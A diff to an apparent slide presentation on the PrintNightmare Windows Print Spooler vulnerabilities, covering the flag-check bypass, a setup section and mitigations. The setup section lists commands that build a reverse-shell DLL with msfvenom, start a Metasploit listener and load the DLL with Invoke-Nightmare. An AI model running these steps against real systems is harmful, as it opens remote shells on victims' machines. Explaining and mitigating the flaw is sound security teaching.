@@ -21,6 +21,11 @@
 - Fixed by MS as of Jun 8, 2021
 - *CVE-221-34527*, high risk, allowed remote code execution
 - Rated 8.8 on the Common Vulnerabiltity Scoring System Scale
+** Framework
+- *mimikatz* was first to implement the exploit with both CVEs
+- It was first created as a PoC to show vulns in MS authentication protocols
+- Now it is used by attackers and pentesters to detect potential exploits
+
 * Vulnerabiltity Analysis
 - Two vulns are triggered by the PrintSpoolerService RPC method
   #+ATTR_HTML: :width 70%
@@ -29,10 +34,20 @@
   #+ATTR_HTML: :width 70%
   [[./assets/nspt/cve2.png]]
 
-- *mimikatz* was first to implement the exploit with both CVEs
+** Continued ..
 
+- Once the RPC functions are processed, the YAddPrinterDriverEx function is called
+- There is no conditional judgment on the param dwFileCopyFlags
+- The AddPrinterDriverEx function installs local/remote printer drivers and links config, data and driver files
+  #+ATTR_HTML: :class middle
+  [[./assets/nspt/addprinter.png]]
+- dwFileCopyFLags can set "APD INSTALL WARNED DRIVER" flag
+- When printer driver is added, the DLL is loaded with highest privilege\\
+
+  #+ATTR_HTML: :class middle
+[[./assets/nspt/error.png]]
 ** The Vulnerability
-- Use Process monitor to capture EXP when DLL is loaded
+- Use Process monitor to capture exploit when DLL is loaded
   #+ATTR_HTML: :width 70%
   [[./assets/nspt/pm.png]]
 - dwFileCopyFlags check is skipped when calling YAddPrinterDriverEx method
@@ -45,8 +60,7 @@
 - ValidateObjectAccess result is 0 for user and 1 for admin
     #+ATTR_HTML: :width 60%
   [[./assets/nspt/rpcbind.png]]
-- To bypass the ValidateObjectAccess, if the "APD INSTALL WARNED DRIVER" is set to 1
-- The result of _bittest method is 1, as a result ValidateObjectAccess is bypassed
+- If the "APD INSTALL WARNED DRIVER" flag is 1, the result of _bittest method will be 1 and v12 will be 0, as a result ValidateObjectAccess is bypassed
     #+ATTR_HTML: :width 60%
   [[./assets/nspt/bittest.png]]
 ** ValidateDriverInfo
@@ -106,7 +120,7 @@
 ** Setup
 - Setup exploit DLL
   #+begin_src
-msfvenom -p /reverse_tcp_path LHOST=[YOUR_IP] LPORT=4545 -f dll -o spoolerevil.dll
+msfvenom -p /path/to/reverse_tcp LHOST=[YOUR_IP] LPORT=4545 -f dll -o reverse_tcp.dll
   #+end_src
 - Execute DLL
   #+begin_src
@@ -121,13 +135,17 @@ run -j
   #+end_src
 - DLL Injection
     #+begin_src
-python CVE-2021-1675.py username:password@<targetName or address> Path to DLL
+powershell -ep bypass
+..\CVE-2021-1675.ps1
+Invoke-Nightmare -DLL C:\Users\test\Desktop\reverse_tcp.dll
 
+# go back to msfconsole
 session -i 1
     #+end_src
 
 * Demo
 * Conclusion
 - Spooler vuln was first used in Stuxnet attack 10 years ago
-- MSs incomplete patch of the CVEs made windows users vulnerable to attacks
-- MS has taken step to ameliorate the situation but 34527 is still unsolved
+- MS has taken step to ameliorate the situation and released patches within 5 days
+- A quick way to stop the vulnerability is to stop the PrintSpooler service
+- Another workaround is to disable the inbound remote printing operations via group policy
